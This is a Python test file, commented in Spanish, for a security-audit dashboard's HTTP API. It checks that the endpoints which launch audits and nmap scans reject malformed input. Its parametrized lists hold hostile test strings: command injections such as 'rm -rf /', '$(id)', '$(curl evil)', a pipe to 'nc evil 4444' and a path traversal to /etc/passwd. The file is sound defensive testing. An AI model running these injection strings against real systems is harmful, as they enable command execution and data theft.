"""Rutas HTTP del dashboard (`api/`) — la frontera de entrada del sistema.

La memoria afirma que la suite cubre «el *backend* del dashboard», y era cierto a
medias: `aggregator.py` (la capa de datos) estaba cubierto, pero las **rutas** y el
lanzador de auditorías estaban al 0 %. Eso importa por dos razones:

  1. Es la única superficie del sistema expuesta por red, y recibe una IP y unos
     argumentos que acaban alimentando un subproceso: la **validación de entrada**
     de estas rutas es una capa de contención, no una comodidad de la API.
  2. Materializa OM4, así que su comportamiento observable (códigos de estado,
     forma de la respuesta) es parte de lo que el trabajo afirma haber construido.

Ningún test lanza una auditoría real: el `AuditManager` se sustituye por un doble.
"""
import pytest
from fastapi.testclient import TestClient

from api.main import create_app


@pytest.fixture
def client():
    return TestClient(create_app())


# --------------------------------------- validación de entrada (contención)

INJECTION_ATTEMPTS = [
    "192.168.1.1; rm -rf /",        # separador de comandos
    "192.168.1.1 && id",
    "$(id)",                         # sustitución de comandos
    "`whoami`",
    "../../etc/passwd",              # traversal
    "192.168.1.1|nc evil 4444",      # tubería
    "localhost",                     # nombre, no IPv4
    "999.999.999.999",               # fuera de rango sintáctico
    "",
]


@pytest.mark.parametrize("target_ip", INJECTION_ATTEMPTS)
def test_audit_rejects_anything_that_is_not_a_plain_ipv4(client, target_ip):
    """El `target_ip` viaja hasta la línea de comandos de `run.py`: si esta
    frontera no lo acota, el resto de las capas de contención llegan tarde."""
    r = client.post("/api/audits", json={"target_ip": target_ip})
    assert r.status_code == 422, r.text


@pytest.mark.parametrize("model", [
    "claude-haiku-4-5; rm -rf /",
    "$(curl evil)",
    "modelo con espacios",
    "a|b",
])
def test_audit_rejects_a_malformed_model_name(client, model):
    r = client.post("/api/audits", json={"target_ip": "192.168.1.1", "model": model})
    assert r.status_code == 422, r.text


@pytest.mark.parametrize("model", [
    "claude-sonnet-4-6",
    "claude-sonnet-4-6",
    "us.anthropic.claude-haiku-4-5-20251001-v1:0",   # inference profile de Bedrock
])
def test_audit_accepts_the_documented_model_names(client, monkeypatch, model):
    """Los nombres del Anexo A tienen que pasar: una validación que rechaza el
    uso legítimo es tan defectuosa como una que admite lo peligroso."""
    _stub_manager(monkeypatch)
    r = client.post("/api/audits", json={"target_ip": "192.168.1.1", "model": model})
    assert r.status_code == 200, r.text


@pytest.mark.parametrize("cidr", [
    "192.168.1.0/24; id",
    "192.168.1.0",          # sin prefijo
    "not-a-cidr",
    "192.168.1.0/33",       # prefijo fuera de rango
    "300.1.1.0/24",         # octeto fuera de rango
])
def test_subnet_scan_rejects_a_malformed_cidr(client, cidr):
    """El CIDR acaba en los argumentos de `nmap -sn`."""
    r = client.post("/api/scan", json={"cidr": cidr})
    assert r.status_code == 422, r.text


@pytest.mark.parametrize("timeout", [1, 4, 601, 100000])
def test_subnet_scan_bounds_the_timeout(client, timeout):
    """Un timeout sin cota permite dejar un nmap colgado indefinidamente."""
    r = client.post("/api/scan", json={"cidr": "192.168.1.0/24",
                                      "timeout_seconds": timeout})
    assert r.status_code == 422, r.text


# ------------------------------------------------- lanzamiento de auditorías

class _FakeAudit:
    """Réplica mínima del objeto Audit: solo `as_summary()` y `exit_code`."""

    def __init__(self, audit_id, target_ip, model=None, extra_args=None):
        self.audit_id = audit_id
        self.target_ip = target_ip
        self.model = model
        self.extra_args = extra_args
        self.status = "running"
        self.exit_code = None

    def as_summary(self):
        return {"audit_id": self.audit_id, "target_ip": self.target_ip,
                "status": self.status, "exit_code": self.exit_code}


class _FakeManager:
    """Doble ASÍNCRONO del AuditManager: registra lo que se le pide sin lanzar
    ningún proceso. El contrato real es async, así que el doble también."""

    def __init__(self):
        self.started = []
        self.queued = []
        self.stopped = []
        self.modos = []
        self.audits = {}

    async def start(self, target_ip, model=None, extra_args=None,
                    replica=(1, 1), policy_disabled=False):
        audit_id = f"audit-{len(self.started) + 1}"
        self.started.append({"target_ip": target_ip, "model": model,
                             "extra_args": extra_args,
                             "policy_disabled": policy_disabled})
        self.audits[audit_id] = _FakeAudit(audit_id, target_ip, model, extra_args)
        return self.audits[audit_id]

    # El camino normal encola en lugar de lanzar: el doble replica ese contrato.
    async def enqueue(self, target_ip, model=None, extra_args=None,
                      replica=(1, 1), policy_disabled=False, carril=None):
        audit = await self.start(target_ip, model=model, extra_args=extra_args,
                                 replica=replica, policy_disabled=policy_disabled)
        self.queued.append(audit.audit_id)
        return audit

    async def start_replicas(self, target_ip, runs_per_target,
                            model=None, extra_args=None, policy_disabled=False,
                            concurrent=False, modo=None):
        self.modos.append(modo)
        first = None
        for i in range(1, runs_per_target + 1):
            audit = await self.enqueue(target_ip, model=model,
                                       extra_args=extra_args, replica=(i, runs_per_target),
                                       policy_disabled=policy_disabled)
            first = first or audit
        return first

    async def list(self):
        return [a.as_summary() for a in self.audits.values()]

    async def get(self, audit_id):
        return self.audits.get(audit_id)

    async def stop(self, audit_id):
        if audit_id in self.audits:
            self.stopped.append(audit_id)
            self.audits[audit_id].status = "stopped"


def _stub_manager(monkeypatch):
    from api.routes import audits as audits_route
    fake = _FakeManager()
    monkeypatch.setattr(audits_route.audit_runner, "get_manager", lambda: fake)
    return fake


def test_starting_an_audit_returns_an_identifier(client, monkeypatch):
    fake = _stub_manager(monkeypatch)
    r = client.post("/api/audits", json={"target_ip": "192.168.1.50"})
    assert r.status_code == 200, r.text
    assert r.json().get("audit_id") or r.json().get("audit")
    assert fake.started and fake.started[0]["target_ip"] == "192.168.1.50"


def test_extra_args_reach_the_runner(client, monkeypatch):
    """`extra_args` es cómo el dashboard pasa flags de `run.py` (p. ej. --max-turns)."""
    fake = _stub_manager(monkeypatch)
    r = client.post("/api/audits", json={"target_ip": "192.168.1.50",
                                        "extra_args": ["--max-turns", "50"]})
    assert r.status_code == 200, r.text
    assert fake.started[0]["extra_args"] == ["--max-turns", "50"]


def test_batch_launches_one_audit_per_target(client, monkeypatch):
    fake = _stub_manager(monkeypatch)
    r = client.post("/api/audits/batch",
                    json={"target_ips": ["192.168.1.50", "192.168.1.51"]})
    assert r.status_code == 200, r.text
    assert len(fake.started) == 2


def test_el_reparto_de_la_tanda_llega_al_planificador(client, monkeypatch):
    """El botón del panel prometía «hosts en paralelo · réplicas en secuencia» y
    nunca enviaba la opción que lo activaba: la interfaz decía una cosa y el
    motor hacía otra. Ahora el modo viaja de verdad."""
    fake = _stub_manager(monkeypatch)
    r = client.post("/api/audits/batch",
                    json={"target_ips": ["192.168.1.50"], "runs_per_target": 5,
                          "modo": "por_dispositivo"})
    assert r.status_code == 200, r.text
    assert fake.modos == ["por_dispositivo"]


def test_el_reparto_por_defecto_es_el_secuencial(client, monkeypatch):
    """La comparabilidad entre réplicas no puede depender de un desplegable."""
    fake = _stub_manager(monkeypatch)
    r = client.post("/api/audits/batch", json={"target_ips": ["192.168.1.50"]})
    assert r.status_code == 200, r.text
    assert fake.modos == ["secuencial"]


def test_un_reparto_inventado_se_rechaza(client, monkeypatch):
    _stub_manager(monkeypatch)
    r = client.post("/api/audits/batch",
                    json={"target_ips": ["192.168.1.50"], "modo": "a_lo_loco"})
    assert r.status_code == 422, r.text


def test_batch_rejects_a_bad_ip_without_launching_anything(client, monkeypatch):
    """Validación de todo o nada: un objetivo inválido no puede colar mientras el
    resto ya se han lanzado."""
    fake = _stub_manager(monkeypatch)
    r = client.post("/api/audits/batch",
                    json={"target_ips": ["192.168.1.50", "no-es-una-ip"]})
    assert r.status_code == 422, r.text
    assert not fake.started


def test_listing_audits_reports_what_is_running(client, monkeypatch):
    fake = _stub_manager(monkeypatch)
    client.post("/api/audits", json={"target_ip": "192.168.1.50"})
    r = client.get("/api/audits")
    assert r.status_code == 200
    assert any(a["target_ip"] == "192.168.1.50" for a in r.json()["audits"])
    assert fake.audits


@pytest.mark.parametrize("path, expected", [
    # El manager no lo conoce → 404 (la ruta no toca el sistema de ficheros).
    ("/api/audits/no-existe", 404),
    # El transcript sí compone una RUTA de fichero, así que el identificador se
    # valida antes de usarlo: un id que no tiene forma de timestamp es una
    # petición mal formada (400), no un recurso ausente. La distinción importa
    # —404 invitaba a probar variantes hasta dar con una que colara—.
    ("/api/audits/no-existe/log", 400),
    # Un intento de travesía con `/` codificado no llega ni al handler: el
    # parámetro de ruta no admite barras, así que el enrutador no casa y
    # responde 404. Se deja fijado para que quede constancia de que la defensa
    # tiene dos capas —enrutado y validación— y no depende de una sola.
    ("/api/audits/..%2f..%2fetc%2fpasswd/log", 404),
    # Bien formado pero inexistente: eso sí es un 404.
    ("/api/audits/20260101_000000/log", 404),
])
def test_unknown_audit_is_handled_without_crashing(client, monkeypatch, path, expected):
    _stub_manager(monkeypatch)
    assert client.get(path).status_code == expected


def test_stopping_an_unknown_audit_is_a_404(client, monkeypatch):
    _stub_manager(monkeypatch)
    assert client.post("/api/audits/no-existe/stop").status_code == 404


def test_stopping_a_running_audit_marks_it_stopped(client, monkeypatch):
    fake = _stub_manager(monkeypatch)
    client.post("/api/audits", json={"target_ip": "192.168.1.50"})
    r = client.post("/api/audits/audit-1/stop")
    assert r.status_code == 200, r.text
    assert "audit-1" in fake.stopped


# ------------------------------------------- lectura de datos (agregador)

def test_devices_route_returns_the_aggregated_list(client, monkeypatch):
    from api.routes import devices as devices_route
    monkeypatch.setattr(devices_route.aggregator, "list_devices",
                        lambda: [{"device_key": "D-Link|DIR-815|00:DE:FA:1A:01:00"}])
    r = client.get("/api/devices")
    assert r.status_code == 200
    assert r.json()["devices"][0]["device_key"].startswith("D-Link")


def test_unknown_device_is_a_404(client, monkeypatch):
    from api.routes import devices as devices_route
    monkeypatch.setattr(devices_route.aggregator, "get_device", lambda key: None)
    assert client.get("/api/devices/no|existe|00:00:00:00:00:00").status_code == 404


def test_cves_routes_expose_the_catalogue(client, monkeypatch):
    from api.routes import cves as cves_route
    monkeypatch.setattr(cves_route.aggregator, "list_cves",
                        lambda: [{"cve_id": "CVE-2021-33558"}])
    monkeypatch.setattr(cves_route.aggregator, "get_cve",
                        lambda cid: {"cve_id": cid} if cid == "CVE-2021-33558" else None)
    assert client.get("/api/cves").json()["cves"][0]["cve_id"] == "CVE-2021-33558"
    assert client.get("/api/cves/CVE-2021-33558").status_code == 200
    assert client.get("/api/cves/CVE-0000-0000").status_code == 404


def test_reports_routes_expose_listing_stats_and_detail(client, monkeypatch):
    from api.routes import reports as reports_route
    monkeypatch.setattr(reports_route.aggregator, "list_reports",
                        lambda: [{"report_id": "audit_report_20260725_120000"}])
    monkeypatch.setattr(reports_route.aggregator, "global_stats",
                        lambda: {"total_reports": 1, "devices": 1})
    monkeypatch.setattr(reports_route.aggregator, "get_report",
                        lambda rid: {"report_id": rid} if rid.startswith("audit") else None)
    assert client.get("/api/reports").json()["reports"]
    assert client.get("/api/reports/stats").json()["total_reports"] == 1
    assert client.get("/api/reports/audit_report_20260725_120000").status_code == 200
    assert client.get("/api/reports/no-existe").status_code == 404


def test_openapi_schema_is_served(client):
    """El esquema documenta la API del dashboard; si se rompe, el front pierde
    su contrato."""
    r = client.get("/api/openapi.json")
    assert r.status_code == 200
    paths = r.json()["paths"]
    for expected in ("/api/audits", "/api/devices", "/api/cves", "/api/reports"):
        assert any(p.startswith(expected) for p in paths), expected


def test_una_ip_suelta_es_un_lote_de_uno(client, monkeypatch):
    """El panel tenía dos botones que hacían cosas distintas sin que nadie lo
    hubiera decidido: auditar una IP marcándola en la lista respetaba las
    réplicas y el reparto, y auditar la misma IP escribiéndola a mano daba
    siempre una ejecución, porque cada botón tenía cableado un endpoint
    distinto. El lote acepta un objetivo igual que acepta cinco, así que el
    camino es uno solo."""
    fake = _stub_manager(monkeypatch)
    r = client.post("/api/audits/batch",
                    json={"target_ips": ["192.168.1.50"], "runs_per_target": 5,
                          "modo": "secuencial"})
    assert r.status_code == 200, r.text
    assert len(fake.started) == 5, "una IP con 5 réplicas son 5 ejecuciones"
    assert fake.modos == ["secuencial"]
